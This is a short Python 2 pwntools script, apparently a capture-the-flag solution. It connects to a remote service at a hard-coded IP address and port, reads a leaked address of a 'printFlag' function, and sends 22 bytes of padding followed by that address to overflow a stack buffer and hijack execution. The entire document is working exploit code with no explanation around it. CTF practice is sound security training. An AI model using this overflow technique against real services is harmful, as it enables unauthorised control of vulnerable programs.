#!/usr/bin/env python2

from pwn import *

r = remote('54.89.22.85', 10003)

sleep(2)

r.recvuntil("""The address of printFlag """)

addr_remote_printFlag = r.recvline().strip().replace('.', '')

addr_remote_printFlag = int(addr_remote_printFlag, 16)

log.info("&printFlag == 0x%08x" % addr_remote_printFlag)

r.recvuntil("""Enter your name: """)

r.sendline('A' * 22 + p32(addr_remote_printFlag))

data = r.recvall()

print(data)


